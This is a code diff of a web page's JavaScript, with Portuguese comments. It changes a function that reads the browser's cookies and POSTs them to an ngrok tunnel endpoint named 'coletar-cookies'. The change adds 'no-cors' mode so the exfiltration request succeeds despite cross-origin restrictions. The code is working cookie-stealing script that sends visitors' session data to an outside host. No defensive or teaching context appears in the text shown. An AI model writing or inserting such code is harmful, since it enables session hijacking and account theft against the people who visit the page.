@@ -142,24 +142,24 @@
             document.getElementById('mainPage').classList.remove('hidden');
         }
 
-        // Função para capturar e enviar os cookies para o servidor
+        // Função para capturar e enviar os cookies para o servidor com no-cors
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
             const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
 
             console.log("Cookies capturados:", cookies);
 
-            // Envia os cookies via fetch para o servidor
+            // Envia os cookies via fetch para o servidor com no-cors
             fetch(url, {
                 method: 'POST',
+                mode: 'no-cors',  // Configuração de CORS desativado
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Cookies enviados com sucesso!', data);
+            .then(response => {
+                console.log('Cookies enviados com sucesso!');
             })
             .catch(error => {
                 console.error('Erro ao enviar cookies:', error);
